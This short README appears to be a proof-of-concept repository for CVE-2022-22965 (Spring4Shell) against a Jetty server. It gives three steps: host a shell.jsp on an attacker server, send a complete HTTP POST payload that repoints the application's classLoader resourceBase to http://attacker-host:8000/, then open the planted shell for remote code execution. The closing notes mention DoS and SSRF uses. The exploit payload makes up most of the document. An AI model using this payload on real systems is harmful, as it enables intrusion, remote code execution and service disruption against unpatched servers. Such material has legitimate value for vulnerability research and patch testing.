# Poc-Spring4Shell-Jetty
Poc of CVE-2022-22965 (Spring4Shell) in Jetty serrver

1. Step 1
- Create a simple http server containing shell.jsp file in the hacker server
3. Step 2
- Send this payload to the victim server:
```
POST /exploit HTTP/1.1
Host: victim-host:8888
User-Agent: PetrusViet
Accept-Encoding: gzip, deflate 
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

class.module.classLoader.context.resourceBase=http://attacker-host:8000/&
```
4. Step 3
- Go to http://victim-host:8888/shell.jsp

Note: 

1. Outbound is required to RCE
2. If there is no outbound, the payload can be used to: dos, ssrf,...
3. Do not use this payload for real target, this may crash the web application.
